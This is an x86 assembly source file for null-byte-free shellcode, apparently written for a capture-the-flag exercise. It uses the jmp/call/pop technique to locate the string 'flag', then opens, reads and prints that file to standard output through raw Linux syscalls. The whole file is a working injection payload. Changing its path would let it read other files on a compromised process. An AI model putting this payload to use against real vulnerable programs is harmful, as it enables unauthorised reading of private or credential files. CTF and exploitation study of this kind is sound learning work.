#include <sys/syscall.h>

#define PATHNAME "flag"
#define STRLEN   4

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  popl    %esi						/* esi points to PATHNAME, stack base */
  xorl    %eax,%eax					/* get a 32-bit zero value */
  movb    %al,(STRLEN)(%esi)		/* null-terminate PATHNAME */
  
  /* sys_open */
  movb    $SYS_open,%al				/* syscall number */
  movl    %esi,%ebx					/* arg 1: string pathname */
  xorl    %ecx,%ecx					/* arg 2: flag:0 */
  int     $0x80						/* open("flag",0) */
  test    %eax,%eax
  jz      exit
  
  /* sys_read */
  movl    %eax,%ebx					/*arg 1: file descriptor */ 
  xorl    %eax,%eax
  movb    $SYS_read,%al				/*arg 0: syscall number */  
  leal    (STRLEN+1)(%esi),%ecx		/*arg 2: *buf */
  xorl    %edx,%edx
  inc     %edx
  shll    $11,%edx					/*arg 3: size_t count 2048 */
  int     $0x80						/*read(fd,buf,2048) */
  test    %eax,%eax
  jz      exit

  /* sys_write */
  movl    %eax,%edx					/*arg 3: size_t */
  xorl    %eax,%eax
  movb    $SYS_write,%al
  xorl    %ebx,%ebx
  inc     %ebx						/*arg 1: fd=1 stdout */
  int     $0x80

exit:
  xorl    %ebx,%ebx					/* arg 1: 0 */
  movl    %ebx,%eax
  inc     %eax						/* exit(0) */
  /* mov+inc to avoid null byte */
  int     $0x80						/* invoke syscall */

calladdr:
  call    popladdr
  .string PATHNAME
